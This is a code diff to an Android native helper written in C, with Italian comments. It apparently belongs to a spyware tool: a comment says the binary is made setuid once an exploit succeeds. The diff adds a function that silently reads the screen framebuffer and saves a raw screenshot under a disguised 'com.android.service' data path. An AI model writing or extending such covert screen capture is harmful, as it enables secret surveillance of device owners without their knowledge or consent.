@@ -4,6 +4,7 @@
 #include <sys/mount.h>
 #include <sys/param.h>
 #include <sys/time.h>
+#include <sys/mman.h>
 #include <linux/netlink.h>
 #include <sys/socket.h>
 #include <sys/un.h>
@@ -23,6 +24,8 @@
 #include <android/log.h>
 #include <dirent.h>
 #include <linux/reboot.h>
+#include <linux/fb.h>
+#include <linux/kd.h>
 
 #define LOG(x)  printf(x)
 
@@ -36,6 +39,7 @@ void my_chown(const char *user, const char *group, const char *file);
 void my_chmod(const char *mode, const char *file); 
 static void copy_root(const char *mntpnt, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
+static int get_framebuffer();
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 // statuslog -c "/system/bin/cat /dev/graphics/fb0"
@@ -111,6 +115,79 @@ int main(int argc, char** argv) {
 	}
 
 	return 0;
+}
+
+// Allo stato attuale, la copy funziona meglio...
+// Come referenza futura: http://www.pocketmagic.net/?p=1473
+static int get_framebuffer() {
+	int fd, fd_out;
+	void *bits;
+	struct fb_var_screeninfo vi;
+	struct fb_fix_screeninfo fi;
+	ssize_t written;
+
+	fd = open("/dev/graphics/fb0", O_RDONLY);
+
+	if (fd < 0) {
+		perror("cannot open fb0");
+		return 0;
+	}
+
+	if (ioctl(fd, FBIOGET_FSCREENINFO, &fi) < 0) {
+		perror("failed to get fb0 info");
+		return 0; 
+	}
+
+	if (ioctl(fd, FBIOGET_VSCREENINFO, &vi) < 0) {
+		perror("failed to get fb0 info");
+		return 0;
+	}
+
+
+	bits = mmap(0, fi.smem_len, PROT_READ, MAP_PRIVATE, fd, 0);
+
+	if (bits == MAP_FAILED) {
+		perror("failed to mmap framebuffer");
+		return 0;
+	}
+
+
+	fd_out = open("/data/data/com.android.service/files/frame", O_CREAT | O_RDWR);
+
+	if (fd_out < 0) {
+		perror("failed to create frame file");
+		return 0;
+	}
+
+	written = write(fd_out, bits, fi.smem_len);
+
+	if (written <= 0) {
+		perror("cannot write to file");
+		return 0;
+	}
+
+	close(fd);
+	close(fd_out);
+
+	return 0;
+
+	/*fb->version = sizeof(*fb);
+	fb->width = vi.xres;
+	fb->height = vi.yres;
+	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
+	fb->data = bits;
+	fb->format = GGL_PIXEL_FORMAT_RGB_565;
+
+	fb++;
+
+	fb->version = sizeof(*fb);
+	fb->width = vi.xres;
+	fb->height = vi.yres;
+	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
+	fb->data = (void*) (((unsigned) bits) + vi.yres * vi.xres * 2);
+	fb->format = GGL_PIXEL_FORMAT_RGB_565;
+
+	return fd;*/
 }
 
 void my_chmod(const char *mode, const char *file) {
